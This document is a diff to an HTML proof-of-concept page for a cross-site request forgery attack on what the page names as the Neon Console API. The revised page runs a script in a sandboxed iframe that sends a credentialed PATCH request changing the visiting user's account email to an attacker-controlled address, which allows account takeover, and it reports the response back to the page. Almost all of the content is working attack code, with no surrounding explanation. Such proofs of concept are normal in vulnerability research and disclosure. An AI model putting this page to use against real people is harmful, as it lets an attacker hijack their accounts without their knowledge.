@@ -1,27 +1,49 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CSRF PoC - Neon Console Email Change</title>
+</head>
 <body>
-<h2>CSRF PoC Result:</h2>
-<pre id="result">Sending...</pre>
-<script>
-fetch("https://console.neon.tech/api/v2/users/me", {
-  method: "PATCH",
-  credentials: "include",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    id: "18b81f74-7623-427e-a297-d21b37d9b089",
-    first_name: "hacked",
-    last_name: "hacked"
-  })
-})
-.then(res => {
-  document.getElementById("result").textContent = 
-    "Status: " + res.status + " " + res.statusText;
-})
-.catch(err => {
-  document.getElementById("result").textContent = 
-    "Error: " + err.message;
-});
-</script>
+  <h2>CSRF PoC - Neon Console Email Change</h2>
+  <pre id="result">Sending...</pre>
+  <script>
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts';
+    iframe.srcdoc = `
+      <script>
+        const timeout = setTimeout(() => {
+          parent.postMessage('Timed out - request still pending', '*');
+        }, 5000);
+
+        fetch("https://console.neon.tech/api/v2/users/me", {
+          method: "PATCH",
+          credentials: "include",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            id: "18b81f74-7623-427e-a297-d21b37d9b089",
+            email: "attacker@gmail.com"
+          })
+        })
+        .then(res => {
+          clearTimeout(timeout);
+          parent.postMessage("Status: " + res.status + " " + res.statusText, "*");
+          return res.text();
+        })
+        .then(body => {
+          parent.postMessage("Body: " + (body || "(empty)"), "*");
+        })
+        .catch(err => {
+          clearTimeout(timeout);
+          parent.postMessage("Error: " + err.message, "*");
+        });
+      <\/script>
+    `;
+
+    document.body.appendChild(iframe);
+
+    window.addEventListener('message', e => {
+      document.getElementById('result').textContent += '\n' + e.data;
+    });
+  </script>
 </body>
 </html>
